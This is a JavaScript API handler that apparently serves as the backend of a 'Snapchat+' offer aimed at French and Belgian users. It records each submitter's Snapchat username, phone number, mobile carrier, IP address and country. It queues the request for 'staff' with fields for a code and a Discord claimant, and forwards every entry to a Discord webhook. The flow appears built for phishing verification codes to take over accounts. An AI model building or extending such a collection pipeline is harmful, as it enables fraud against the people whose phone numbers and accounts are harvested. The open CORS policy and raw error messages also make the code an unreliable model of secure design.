/**
 * api/snapchat.js — New request registration
 *
 * v2.3: Replaced SELECT + 409 with UPSERT (INSERT … ON CONFLICT(phone) DO UPDATE).
 *       Same phone → resets the request to pending so staff handles it again.
 *       Username uniqueness check removed entirely — multiple submissions OK.
 *       Requires migration_v2.3.sql (drops UNIQUE(username) constraint).
 */

import { neon }                           from '@neondatabase/serverless';
import { getClientIP, checkBannedIP }     from './middleware.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
    if (req.method === 'OPTIONS') { res.status(200).end(); return; }
    if (req.method !== 'POST')   return res.status(405).json({ success: false, message: 'Method not allowed' });

    try {
        const blocked = await checkBannedIP(req, res);
        if (blocked) return blocked;

        const { username, phone, location, operator, lang } = req.body;

        // ── Basic validation ────────────────────────────────────────────────
        if (!username || !phone || !location || !operator) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        if (!/^[a-zA-Z0-9._-]{3,15}$/.test(username)) {
            return res.status(400).json({ success: false, message: 'Invalid username format' });
        }

        const phoneClean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^\+32/, '0');
        const isBe       = location === 'belgique';
        const phoneRegex = isBe ? /^04[0-9]{8}$/ : /^0[67][0-9]{8}$/;
        if (!phoneRegex.test(phoneClean)) {
            return res.status(400).json({ success: false, message: 'Invalid phone number' });
        }

        if (!process.env.DATABASE_URL) throw new Error('DATABASE_URL not configured');
        const sql     = neon(process.env.DATABASE_URL);
        const ip      = getClientIP(req);
        const country = isBe ? 'Belgium' : 'France';
        const city    = 'Unknown';

        // ── UPSERT ─────────────────────────────────────────────────────────
        // Same phone → reset to pending so staff picks it up again.
        // This replaces the old SELECT + 409 flow: users can now re-submit
        // as many times as they want with the same username or phone number.
        const result = await sql`
            INSERT INTO snap_requests
                (username, phone, location, operator, lang, status, ip_address, country, city)
            VALUES
                (${username.toLowerCase()}, ${phoneClean}, ${location}, ${operator}, ${lang || 'fr'},
                 'pending', ${ip}, ${country}, ${city})
            ON CONFLICT (phone) DO UPDATE
                SET username               = EXCLUDED.username,
                    location               = EXCLUDED.location,
                    operator               = EXCLUDED.operator,
                    lang                   = EXCLUDED.lang,
                    status                 = 'pending',
                    ip_address             = EXCLUDED.ip_address,
                    country                = EXCLUDED.country,
                    city                   = EXCLUDED.city,
                    staff_code             = NULL,
                    code_length            = NULL,
                    claimed_by_discord_id  = NULL
            RETURNING id, username, phone, operator, country, city, ip_address, created_at
        `;

        const row = result[0];

        // ── Optional Discord webhook (fallback when bot is offline) ────────
        if (process.env.DISCORD_WEBHOOK_URL) {
            try {
                const carrierNames = {
                    orange: 'Orange', sfr: 'SFR', bouygues: 'Bouygues',
                    base: 'BASE', orange_be: 'Orange Belgique', proximus: 'Proximus', telenet: 'Telenet',
                };
                const embed = {
                    title: '📱 Nouvelle demande Snapchat+',
                    color: 0xfffc00,
                    fields: [
                        { name: 'Username',  value: '``' + row.username + '``',                                inline: true },
                        { name: 'Téléphone', value: '``' + row.phone    + '``',                                inline: true },
                        { name: 'Opérateur', value: '``' + (carrierNames[row.operator] || row.operator) + '``', inline: true },
                        { name: 'Pays',      value: '``' + row.country   + '``',                               inline: true },
                        { name: 'IP',        value: '``' + row.ip_address + '``',                              inline: true },
                        { name: 'Date',      value: new Date(row.created_at).toLocaleString('fr-FR'),          inline: false },
                    ],
                    footer:    { text: 'ID: ' + row.id },
                    timestamp: new Date().toISOString(),
                };
                await fetch(process.env.DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] }),
                });
            } catch (e) { console.error('Webhook error:', e); }
        }

        return res.status(200).json({
            success: true,
            message: 'Request registered',
            data: { id: row.id, username: row.username, phone: row.phone },
        });
    } catch (error) {
        console.error('Neon DB Error:', error);
        return res.status(500).json({ success: false, message: error.message || 'Server error' });
    }
}
